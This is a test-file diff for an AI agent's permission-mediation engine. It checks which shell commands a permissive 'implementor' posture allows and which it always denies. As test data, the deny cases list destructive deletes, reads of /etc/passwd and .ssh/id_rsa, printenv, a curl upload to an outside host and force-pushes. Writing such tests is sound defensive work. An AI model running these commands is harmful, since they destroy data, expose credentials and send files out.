@@ -8,7 +8,7 @@
  *
  * Integration-style: real child processes, real timers, generous bounds.
  */
-import { mkdtemp, rm, symlink, writeFile } from 'node:fs/promises';
+import { mkdir, mkdtemp, rm, symlink, writeFile } from 'node:fs/promises';
 import { noPayloadToVerify } from './session.js';
 import { writeBoundary } from '../../worktree/write-scope.js';
 import { tmpdir } from 'node:os';
@@ -42,8 +42,10 @@ import {
   parseConfigOptionsWire,
   resolveModePin,
   type AcpAdapterOptions,
+  type PermissionMediationConfig,
   type SessionModePolicy,
 } from './session.js';
+import { denyByDefaultPosture, permissiveImplementorPosture } from '../../lib/permanent-deny.js';
 
 const GENEROUS_MS = 20_000;
 const SPAWN_NONCE = 'spawn-session-nonce-1';
@@ -180,7 +182,7 @@ describe('permission mediation decision core (§10.2, T20)', () => {
       action: 'deny',
       reason: 'denied_default',
     });
-    const policy = { verifyOperationPayload: noPayloadToVerify, mode: 'headless', policy: { allow: ['write file'] } } as const;
+    const policy = { verifyOperationPayload: noPayloadToVerify, mode: 'headless', policy: { implementorPosture: denyByDefaultPosture, allow: ['write file'] } } as const;
     expect(decidePermission(policy, 'write file').action).toBe('allow');
     expect(decidePermission(policy, 'write file 2').action).toBe('deny');
     expect(decidePermission(policy, 'Write File').action).toBe('deny'); // exact match, case-sensitive
@@ -212,7 +214,7 @@ describe('permission mediation decision core (§10.2, T20)', () => {
     };
 
     it('VETOES an ALLOWLISTED title whose payload is missing or hostile', () => {
-      const policy = { mode: 'headless', policy: { allow: [shellTitle] }, verifyOperationPayload } as const;
+      const policy = { mode: 'headless', policy: { implementorPosture: denyByDefaultPosture, allow: [shellTitle] }, verifyOperationPayload } as const;
       // The regression: allowlisted + no payload used to be `allow/allowlisted`.
       expect(decidePermission(policy, shellTitle, undefined)).toEqual({
         action: 'deny',
@@ -232,7 +234,7 @@ describe('permission mediation decision core (§10.2, T20)', () => {
     it('VETOES a READ-ONLY-classified title whose payload diverges', () => {
       const policy = {
         mode: 'headless',
-        policy: { allow: [], allowReadOnlyOperation: () => true },
+        policy: { implementorPosture: denyByDefaultPosture, allow: [], allowReadOnlyOperation: () => true },
         verifyOperationPayload,
       } as const;
       expect(decidePermission(policy, 'Execute `ls`', { command: 'rm -rf /' })).toEqual({
@@ -249,7 +251,7 @@ describe('permission mediation decision core (§10.2, T20)', () => {
       const policy = {
         mode: 'headless',
         role: 'implementor',
-        policy: { allow: [], workspaceWriteBoundary: writeBoundary({ mode: 'worktree', executionRoot: '/repo' }) },
+        policy: { implementorPosture: denyByDefaultPosture, allow: [], workspaceWriteBoundary: writeBoundary({ mode: 'worktree', executionRoot: '/repo' }) },
         verifyOperationPayload: () => false,
       } as const;
       expect(decidePermission(policy, 'Write `/repo/src/a.ts`', undefined).action).toBe('deny');
@@ -258,7 +260,7 @@ describe('permission mediation decision core (§10.2, T20)', () => {
     it('a THROWING veto is a denial, never a pass', () => {
       const policy = {
         mode: 'headless',
-        policy: { allow: [shellTitle] },
+        policy: { implementorPosture: denyByDefaultPosture, allow: [shellTitle] },
         verifyOperationPayload: (): boolean => {
           throw new Error('classifier exploded');
         },
@@ -288,7 +290,7 @@ describe('permission mediation decision core (§10.2, T20)', () => {
     });
 
     it('no veto configured leaves every existing decision untouched', () => {
-      const policy = { verifyOperationPayload: noPayloadToVerify, mode: 'headless', policy: { allow: [shellTitle] } } as const;
+      const policy = { verifyOperationPayload: noPayloadToVerify, mode: 'headless', policy: { implementorPosture: denyByDefaultPosture, allow: [shellTitle] } } as const;
       expect(decidePermission(policy, shellTitle, undefined)).toEqual({
         action: 'allow',
         reason: 'allowlisted',
@@ -300,7 +302,7 @@ describe('permission mediation decision core (§10.2, T20)', () => {
     const allowReadOnlyOperation = (operation: string): boolean => operation === 'safe inspection';
     const policy = {
       verifyOperationPayload: noPayloadToVerify, mode: 'headless',
-      policy: { allow: [], allowReadOnlyOperation },
+      policy: { implementorPosture: denyByDefaultPosture, allow: [], allowReadOnlyOperation },
     } as const;
     expect(decidePermission(policy, 'safe inspection')).toEqual({
       action: 'allow',
@@ -314,7 +316,7 @@ describe('permission mediation decision core (§10.2, T20)', () => {
       decidePermission(
         {
           verifyOperationPayload: noPayloadToVerify, mode: 'headless',
-          policy: {
+          policy: { implementorPosture: denyByDefaultPosture,
             allow: [],
             allowReadOnlyOperation: () => {
               throw new Error('classifier bug');
@@ -329,7 +331,7 @@ describe('permission mediation decision core (§10.2, T20)', () => {
   it('coordinator/verifier WRITE requests are always denied — in every mode, over any allowlist', () => {
     expect(
       decidePermission(
-        { verifyOperationPayload: noPayloadToVerify, mode: 'headless', role: 'verifier', policy: { allow: ['write file'] } },
+        { verifyOperationPayload: noPayloadToVerify, mode: 'headless', role: 'verifier', policy: { implementorPosture: denyByDefaultPosture, allow: ['write file'] } },
         'write file',
       ),
     ).toEqual({ action: 'deny', reason: 'denied_role_write' });
@@ -342,14 +344,14 @@ describe('permission mediation decision core (§10.2, T20)', () => {
     // Read-only operations are NOT vetoed for those roles.
     expect(
       decidePermission(
-        { verifyOperationPayload: noPayloadToVerify, mode: 'headless', role: 'verifier', policy: { allow: ['read config'] } },
+        { verifyOperationPayload: noPayloadToVerify, mode: 'headless', role: 'verifier', policy: { implementorPosture: denyByDefaultPosture, allow: ['read config'] } },
         'read config',
       ).action,
     ).toBe('allow');
     // Implementor writes follow the normal policy.
     expect(
       decidePermission(
-        { verifyOperationPayload: noPayloadToVerify, mode: 'headless', role: 'implementor', policy: { allow: ['write file'] } },
+        { verifyOperationPayload: noPayloadToVerify, mode: 'headless', role: 'implementor', policy: { implementorPosture: denyByDefaultPosture, allow: ['write file'] } },
         'write file',
       ).action,
     ).toBe('allow');
@@ -376,7 +378,7 @@ describe('permission mediation decision core (§10.2, T20)', () => {
       // this test has always asserted — every containment expectation below is
       // unchanged, including the direct `isWorkspaceWriteOperation(…, root)`
       // calls, which still take the bare root.
-      policy: { allow: [], workspaceWriteBoundary: writeBoundary({ mode: 'worktree', executionRoot: root }) },
+      policy: { implementorPosture: denyByDefaultPosture, allow: [], workspaceWriteBoundary: writeBoundary({ mode: 'worktree', executionRoot: root }) },
     } as const;
 
     // F14 (found while consolidating containment): a `..` that FOLLOWS a symlink
@@ -416,6 +418,250 @@ describe('permission mediation decision core (§10.2, T20)', () => {
         insideTitle,
       ),
     ).toEqual({ action: 'deny', reason: 'denied_role_write' });
+  });
+});
+
+// ---------------------------------------------------------------------------
+// Spec §2.4 — the INVERTED default for the implementor
+// ---------------------------------------------------------------------------
+describe('§2.4 permissive implementor default', () => {
+  /** A permissive implementor policy rooted at a real temp worktree. */
+  async function permissiveImplementor(): Promise<{
+    readonly root: string;
+    readonly policy: PermissionMediationConfig;
+  }> {
+    const root = await mkdtemp(path.join(tmpdir(), 'acp-permissive-'));
+    cleanups.push(async () => {
+      await rm(root, { recursive: true, force: true });
+    });
+    await mkdir(path.join(root, 'src'), { recursive: true });
+    await writeFile(path.join(root, 'src', 'a.ts'), 'export const a = 1;\n', 'utf8');
+    return {
+      root,
+      policy: {
+        mode: 'headless',
+        role: 'implementor',
+        verifyOperationPayload: noPayloadToVerify,
+        policy: {
+          allow: ['Execute `npm run typecheck`'],
+          implementorPosture: permissiveImplementorPosture(root),
+          workspaceWriteBoundary: writeBoundary({ mode: 'worktree', executionRoot: root }),
+        },
+      },
+    };
+  }
+
+  /** The same policy with the pre-§2.4 posture — the PARENT's behaviour. */
+  function restricted(policy: PermissionMediationConfig): PermissionMediationConfig {
+    if (policy.mode !== 'headless' || policy.policy === undefined) throw new Error('headless policy expected');
+    return { ...policy, policy: { ...policy.policy, implementorPosture: denyByDefaultPosture } };
+  }
+
+  function shell(command: string): { title: string; rawInput: { command: string } } {
+    return { title: `Execute \`${command}\``, rawInput: { command } };
+  }
+
+  it('ALLOWS the harmless exploration that used to end implementor turns', async () => {
+    const { policy } = await permissiveImplementor();
+    // Every one of these is DENIED by the deny-by-default posture — that is the
+    // parent's behaviour, asserted in the same loop so the widening is proved
+    // in both directions rather than claimed.
+    const nowAllowed = [
+      'jq . package.json',
+      'sort src/a.ts',
+      'comm -12 a b',
+      'cut -d, -f1 data.csv',
+      'du -sh src',
+      'stat src/a.ts',
+      'tree src',
+      'diff src/a.ts src/b.ts',
+      'which node',
+      'basename src/a.ts && dirname src/a.ts',
+      'xxd src/a.ts',
+      'mkdir -p src/nested',
+      'touch src/new.ts',
+      'mv src/a.ts src/b.ts',
+      'rm src/a.ts',
+      'ls -la src | sort -r',
+    ];
+    for (const command of nowAllowed) {
+      const { title, rawInput } = shell(command);
+      expect(decidePermission(policy, title, rawInput), `${command} should now be allowed`).toEqual({
+        action: 'allow',
+        reason: 'allowlisted_permissive_implementor',
+      });
+      // THE PARENT: the identical request under the pre-§2.4 posture.
+      expect(decidePermission(restricted(policy), title, rawInput).action, `${command} on the parent`).toBe('deny');
+    }
+  });
+
+  it('keeps allowing everything the status quo already allowed, with its existing reason', async () => {
+    const { root, policy } = await permissiveImplementor();
+    // The read-only classifier is not installed on this policy, so these travel
+    // the §2.4 path; the point is that the ADMISSIONS did not narrow.
+    for (const command of ['git status', 'git log --oneline', 'git ls-tree HEAD', "git tag -l 'v*'", 'cat src/a.ts', 'ls -la', 'git show --stat HEAD 2>&1 | head -20']) {
+      const { title, rawInput } = shell(command);
+      expect(decidePermission(policy, title, rawInput).action, `${command} must stay allowed`).toBe('allow');
+    }
+    // The exact-operation allowlist is NOT gated by the deny list, even though
+    // `npm run typecheck` is a package-manager invocation: those strings are
+    // HOST declarations (the verifier's per-criterion commands travel this
+    // path). Spec §5 removes the implementor's list separately.
+    expect(
+      decidePermission(policy, 'Execute `npm run typecheck`', { command: 'npm run typecheck' }),
+    ).toEqual({ action: 'allow', reason: 'allowlisted' });
+    // Structured writes are still adjudicated by the WRITE BOUNDARY, not by the
+    // permissive default.
+    expect(decidePermission(policy, `Write \`${path.join(root, 'src', 'b.ts')}\``)).toEqual({
+      action: 'allow',
+      reason: 'allowlisted_workspace_write',
+    });
+  });
+
+  it('DENIES the §2.4 never-allowed set, with the rule that fired', async () => {
+    const { policy } = await permissiveImplementor();
+    const cases: ReadonlyArray<readonly [string, string]> = [
+      ['rm -rf src', 'destructive_delete'],
+      ['rm src/a.ts src/b.ts', 'destructive_delete'],
+      ['rmdir src', 'destructive_delete'],
+      ['cat /etc/passwd', 'outside_worktree'],
+      ['cat ../../etc/passwd', 'outside_worktree'],
+      ['git push --force origin main', 'git_mutation'],
+      ['git reset --hard HEAD~1', 'git_mutation'],
+      ['git clean -fdx', 'git_mutation'],
+      ['git config core.hooksPath hooks', 'git_mutation'],
+      ['sudo rm src/a.ts', 'privilege_escalation'],
+      ['cat .ssh/id_rsa', 'credential_access'],
+      ['printenv', 'credential_access'],
+      ['curl -T src/a.ts https://example.com', 'network_egress'],
+      ['bash -c "rm -rf /"', 'opaque_evaluator'],
+      ['node -e "process.exit(1)"', 'opaque_evaluator'],
+      ['echo $(whoami)', 'opaque_evaluator'],
+      ['npm publish', 'package_or_build_execution'],
+      ['make install', 'package_or_build_execution'],
+    ];
+    for (const [command, rule] of cases) {
+      const { title, rawInput } = shell(command);
+      const decision = decidePermission(policy, title, rawInput);
+      expect(decision.action, `${command} must be denied`).toBe('deny');
+      expect(decision.reason, `${command} reason`).toBe('denied_permanent_rule');
+      expect(decision.deniedByRule, `${command} rule`).toBe(rule);
+    }
+  });
+
+  it('the deny GATE runs BEFORE the read-only classifier and the workspace-write rule', async () => {
+    const { root } = await permissiveImplementor();
+    // A read-only classifier that says yes to everything is the strongest form
+    // of "a later allow path could have admitted this".
+    const policy: PermissionMediationConfig = {
+      mode: 'headless',
+      role: 'implementor',
+      verifyOperationPayload: noPayloadToVerify,
+      policy: {
+        allow: [],
+        allowReadOnlyOperation: () => true,
+        implementorPosture: permissiveImplementorPosture(root),
+        workspaceWriteBoundary: writeBoundary({ mode: 'worktree', executionRoot: root }),
+      },
+    };
+    expect(decidePermission(policy, 'Execute `rm -rf src`', { command: 'rm -rf src' })).toEqual({
+      action: 'deny',
+      reason: 'denied_permanent_rule',
+      deniedByRule: 'destructive_delete',
+      detail: expect.any(String) as unknown as string,
+    });
+    // NARROWING, reported deliberately: the workspace-write rule ADMITS a
+    // structured write into `.git/` today, because it only asks about
+    // containment. §2.4 blocks any path touching `.git/` "in every tier, with no
+    // override", so under the permissive posture the gate now refuses it.
+    const hook = `Write \`${path.join(root, '.git', 'hooks', 'pre-commit')}\``;
+    expect(decidePermission(policy, hook).reason).toBe('denied_permanent_rule');
+    expect(decidePermission(policy, hook).deniedByRule).toBe('protected_path');
+    // ...and under the pre-§2.4 posture it is admitted exactly as before, which
+    // is what makes the line above a deliberate narrowing rather than a drift.
+    // The always-true read-only classifier is dropped here so the admission is
+    // attributable to the WORKSPACE-WRITE rule specifically — that is the rule
+    // whose behaviour changed.
+    expect(
+      decidePermission(
+        {
+          mode: 'headless',
+          role: 'implementor',
+          verifyOperationPayload: noPayloadToVerify,
+          policy: {
+            allow: [],
+            implementorPosture: denyByDefaultPosture,
+            workspaceWriteBoundary: writeBoundary({ mode: 'worktree', executionRoot: root }),
+          },
+        },
+        hook,
+      ),
+    ).toEqual({ action: 'allow', reason: 'allowlisted_workspace_write' });
+  });
+
+  it('an UNPARSEABLE operation denies — it never falls through into the permissive default', async () => {
+    const { policy } = await permissiveImplementor();
+    for (const command of ['ls > owned.txt', 'ls & sleep 1', 'cat <(ls)', "ls 'unterminated"]) {
+      const { title, rawInput } = shell(command);
+      expect(decidePermission(policy, title, rawInput), `${command} must not be admitted`).toEqual({
+        action: 'deny',
+        reason: 'denied_unprovable_operation',
+        detail: expect.any(String) as unknown as string,
+      });
+    }
+    // An operation title this engine cannot read at all is likewise unprovable —
+    // not "not a shell request, therefore fine".
+    expect(decidePermission(policy, 'Fetch(https://example.com)').reason).toBe('denied_unprovable_operation');
+    // ...and a payload that is PRESENT BUT MALFORMED is not an absent one.
+    expect(decidePermission(policy, 'Execute `ls`', { command: 42 }).reason).toBe('denied_unprovable_operation');
+  });
+
+  it('cannot reopen a guard that returns EARLIER — the ordering §4.2 depends on', () => {
+    // The §4.2 post-wait lockdown does not exist in the tree yet
+    // (`permission_wait` appears nowhere). What CAN be pinned today is the
+    // property it will rely on: the permissive branch is evaluated LAST and
+    // returns only on an `admissible` verdict, so any guard returning earlier
+    // still wins. The payload veto and the coordinator/verifier write veto are
+    // the two such guards that exist, and both are proved here to survive the
+    // permissive default.
+    const root = tmpdir();
+    const policy: PermissionMediationConfig = {
+      mode: 'headless',
+      role: 'implementor',
+      // A veto that refuses everything stands in for any earlier-returning guard.
+      verifyOperationPayload: () => false,
+      policy: { allow: [], implementorPosture: permissiveImplementorPosture(root) },
+    };
+    expect(decidePermission(policy, 'Execute `ls`', { command: 'ls' })).toEqual({
+      action: 'deny',
+      reason: 'denied_raw_input_mismatch',
+    });
+    // The role write-veto keeps its place at the very top, and the permissive
+    // posture is ignored for the read-only roles.
+    for (const role of ['coordinator', 'verifier'] as const) {
+      expect(
+        decidePermission(
+          { ...policy, role, verifyOperationPayload: noPayloadToVerify } as PermissionMediationConfig,
+          'Execute `rm src/a.ts`',
+          { command: 'rm src/a.ts' },
+        ),
+      ).toEqual({ action: 'deny', reason: 'denied_role_write' });
+    }
+  });
+
+  it('non-implementor roles and the deny-by-default posture are byte-for-byte unchanged', async () => {
+    const { policy } = await permissiveImplementor();
+    // The permissive posture is keyed on the ROLE as well as the policy: a
+    // verifier carrying one still gets the old decision for a non-write.
+    expect(
+      decidePermission({ ...policy, role: 'verifier' } as PermissionMediationConfig, 'Execute `ls`', { command: 'ls' }),
+    ).toEqual({ action: 'deny', reason: 'denied_role_write' });
+    // …and an implementor whose policy states the pre-§2.4 posture lands on the
+    // original terminal reason, not on either new one.
+    expect(decidePermission(restricted(policy), 'Execute `jq . package.json`', { command: 'jq . package.json' })).toEqual({
+      action: 'deny',
+      reason: 'denied_default',
+    });
   });
 });
 
@@ -478,7 +724,7 @@ describe('PLAN §19 test 6 — permission mediation on the wire', () => {
           turns: [{ permission: { toolTitle: 'write file' }, response: { stopReason: 'end_turn' } }],
         },
         {
-          permissions: { verifyOperationPayload: noPayloadToVerify, mode: 'headless', role: 'implementor', policy: { allow: ['write file'] } },
+          permissions: { verifyOperationPayload: noPayloadToVerify, mode: 'headless', role: 'implementor', policy: { implementorPosture: denyByDefaultPosture, allow: ['write file'] } },
         },
       );
       await adapter.initialize();
@@ -508,7 +754,7 @@ describe('PLAN §19 test 6 — permission mediation on the wire', () => {
             },
           ],
         },
-        { permissions: { verifyOperationPayload: noPayloadToVerify, mode: 'headless', policy: { allow: ['some other op'] } } },
+        { permissions: { verifyOperationPayload: noPayloadToVerify, mode: 'headless', policy: { implementorPosture: denyByDefaultPosture, allow: ['some other op'] } } },
       );
       await adapter.initialize();
       const session = await adapter.createSession({ cwd: tmpdir() });
@@ -532,7 +778,7 @@ describe('PLAN §19 test 6 — permission mediation on the wire', () => {
           turns: [{ permission: { toolTitle: 'write file' }, response: { stopReason: 'end_turn' } }],
         },
         {
-          permissions: { verifyOperationPayload: noPayloadToVerify, mode: 'headless', role: 'verifier', policy: { allow: ['write file'] } },
+          permissions: { verifyOperationPayload: noPayloadToVerify, mode: 'headless', role: 'verifier', policy: { implementorPosture: denyByDefaultPosture, allow: ['write file'] } },
         },
       );
       await adapter.initialize();
